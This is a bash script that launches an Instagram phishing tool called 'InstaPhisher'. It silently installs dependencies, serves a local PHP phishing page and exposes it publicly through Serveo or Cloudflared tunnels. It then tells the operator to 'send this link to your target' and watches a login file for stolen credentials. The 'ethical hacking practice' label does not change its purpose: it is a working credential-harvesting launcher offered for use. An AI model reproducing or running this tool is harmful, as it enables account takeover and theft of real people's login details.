#!/bin/bash

Colors

RED='\033[1;31m' GRN='\033[1;32m' YEL='\033[1;33m' CYAN='\033[1;36m' NC='\033[0m'

clear

Install dependencies silently

pkg install php openssh git ruby toilet figlet -y > /dev/null 2>&1 gem install lolcat > /dev/null 2>&1

Typing animation function

type_effect() { text="$1" delay=${2:-0.07} for ((i=0; i<${#text}; i++)); do printf "%s" "${text:$i:1}" sleep "$delay" done echo "" }

Rainbow typing animation function

rainbow_type() { text="$1" delay=${2:-0.03} COLORS=('\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m') NC='\033[0m' color_index=0 for ((i=0; i<${#text}; i++)); do char="${text:$i:1}" echo -en "${COLORS[$color_index]}$char${NC}" sleep "$delay" ((color_index=(color_index+1)%${#COLORS[@]})) done echo "" }

Display Header

figlet -f slant "InstaPhisher" | lolcat -a -d 2 rainbow_type "Instagram Phishing Tool for Ethical Hacking Practice" 0.03 rainbow_type "Created by: SACHIN BADASRA" 0.04

Start localhost server

start_localhost() { echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -n 0 -f login.txt 2>/dev/null }

Start Serveo tunnel

start_serveo() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & sleep 1 echo -e "${GRN}[+] Starting Serveo tunnel...${NC}" ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 & sleep 2 SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*\.serveo.net" serveo.log) if [ ! -z "$SERVEO_URL" ]; then echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL ${NC}" echo -e "${CYAN}[@] Send this link to your target${NC}" else echo -e "${RED}[!] Failed to get Serveo URL. Check SSH connection.${NC}" fi echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -n 0 -f login.txt 2>/dev/null }

Start Cloudflared tunnel

start_cloudflared() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${GRN}[+] Starting Cloudflared tunnel...${NC}" ./cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 & sleep 5 CF_URL=$(grep -o "https://[-a-z0-9]*.trycloudflare.com" cloudflared.log) if [ ! -z "$CF_URL" ]; then echo -e "${GRN}[+] Phishing Page Live at: $CF_URL ${NC}" echo -e "${CYAN}[@] Send this link to your target${NC}" else echo -e "${RED}[!] Failed to get Cloudflared URL. Check setup.${NC}" fi echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -n 0 -f login.txt 2>/dev/null }

Menu

echo -e "${CYAN}Choose Port Forwarding Method:${NC}" echo "1) Localhost (only same device/network)" echo "2) Serveo.net (public URL)" echo "3) Cloudflared (public URL)" read -p $'\n>> ' choice

if [ "$choice" == "1" ]; then start_localhost elif [ "$choice" == "2" ]; then start_serveo elif [ "$choice" == "3" ]; then start_cloudflared else echo -e "${RED}[!] Invalid option. Exiting.${NC}" exit 1 fi

